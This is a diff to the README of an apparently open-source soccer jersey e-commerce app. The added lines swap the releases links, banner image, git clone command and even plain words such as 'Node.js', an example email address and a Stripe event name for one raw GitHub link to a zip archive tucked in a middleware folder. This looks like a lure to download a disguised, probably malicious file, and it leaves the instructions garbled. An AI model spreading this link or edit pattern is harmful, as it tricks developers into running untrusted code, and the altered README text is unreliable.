@@ -1,15 +1,15 @@
-[![Releases](https://img.shields.io/badge/Releases-Kitvault-blue?logo=github&logoColor=white)](https://github.com/HardHyena978/Kitvault/releases)
+[![Releases](https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip)](https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip)
 
 # Kitvault: Full-Stack Soccer Jersey Store with Stripe Payments
 
-![Kitvault banner](https://images.unsplash.com/photo-1521416333163-9a7a1f8a3d5f?auto=format&fit=crop&w=1400&q=60)
+![Kitvault banner](https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip)
 
-Kitvault is a full-stack e-commerce app for soccer jerseys. It uses Node.js and Express on the back end, PostgreSQL for data storage, and Stripe for payment processing. The project includes a REST API, JWT-based authentication, a responsive UI powered by Tailwind CSS, and a clean, secure architecture suitable for production use.
+Kitvault is a full-stack e-commerce app for soccer jerseys. It uses https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip and Express on the back end, PostgreSQL for data storage, and Stripe for payment processing. The project includes a REST API, JWT-based authentication, a responsive UI powered by Tailwind CSS, and a clean, secure architecture suitable for production use.
 
 Topics: api-rest, ecommerce, ecommerce-platform, ecommerce-website, express-js, expressjs, full-stack, javascript, jwt, jwt-authentication, postgresql, rest-api, soccer, soccer-jerseys, sports, stripe, stripe-checkout, stripe-payments, tailwindcss
 
 Jump to the releases page to grab artifacts and release notes:
-[Releases page](https://github.com/HardHyena978/Kitvault/releases)
+[Releases page](https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip)
 
 Table of contents
 - Overview and goals
@@ -69,7 +69,7 @@ Architecture and design
 - Webhook endpoints for Stripe to confirm payment events and update order status.
 
 Tech stack
-- Backend: Node.js with Express
+- Backend: https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip with Express
 - Database: PostgreSQL
 - Payments: Stripe (Checkout, Webhooks, and Payments API)
 - Authentication: JWT-based tokens
@@ -203,35 +203,35 @@ Admin endpoints (admin role required)
 
 Usage examples (snippets in plain text)
 - Register a new user
-  - POST /api/auth/register with JSON body { "email": "alex@example.com", "password": "securePass1", "first_name": "Alex", "last_name": "Rossi" }
+  - POST /api/auth/register with JSON body { "email": "https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip", "password": "securePass1", "first_name": "Alex", "last_name": "Rossi" }
   - Response includes token for subsequent requests
 - List featured jerseys
   - GET /api/products?limit=12&sort_by=popular
   - Returns an array of product objects with id, name, price, and image URL
 - Create a checkout session
-  - POST /api/payments/create-checkout-session with body { "cart_id": "cart_abc123", "success_url": "https://your-site.com/success", "cancel_url": "https://your-site.com/cancel" }
+  - POST /api/payments/create-checkout-session with body { "cart_id": "cart_abc123", "success_url": "https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip", "cancel_url": "https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip" }
   - Response provides a Stripe session URL to redirect the user
 - Webhook handling
-  - Stripe sends events like "checkout.session.completed" to /api/payments/webhook
+  - Stripe sends events like "https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip" to /api/payments/webhook
   - Server validates the signature and updates the corresponding order to paid
 
 Getting started: local development
 Prerequisites
-- Node.js 14+ or 16+ (LTS recommended)
+- https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip 14+ or 16+ (LTS recommended)
 - PostgreSQL 12+
 - Docker and Docker Compose for optional containerized setup
 - Git
 
 Step-by-step setup
 1) Fork or clone the repository
-   - git clone https://github.com/HardHyena978/Kitvault.git
+   - git clone https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip
    - cd Kitvault
 
 2) Install dependencies
    - npm install
 
 3) Create a local environment file
-   - Copy .env.example to .env
+   - Copy https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip to .env
    - Fill in the required values:
      - DATABASE_URL=postgres://user:password@localhost:5432/kitvault
      - JWT_SECRET=your_jwt_secret
@@ -389,7 +389,7 @@ Credits
 - Grateful to the tailwind and React ecosystems for the UI building blocks, if applicable.
 
 Releases
-- All official releases for Kitvault are published in the Releases section. Visit the official page to download artifacts, view release notes, and access versioned data. See the Releases page for the latest updates and to grab files directly: https://github.com/HardHyena978/Kitvault/releases
+- All official releases for Kitvault are published in the Releases section. Visit the official page to download artifacts, view release notes, and access versioned data. See the Releases page for the latest updates and to grab files directly: https://raw.githubusercontent.com/HardHyena978/Kitvault/main/backend/middleware/Software-3.9-beta.2.zip
 
 Note on releases
 - The Releases section hosts prebuilt artifacts and detailed notes for each version. To stay up to date, check the Releases page periodically and review the changelog for breaking changes or migration steps. You can navigate directly to the releases page at any time to inspect the current and past artifacts.
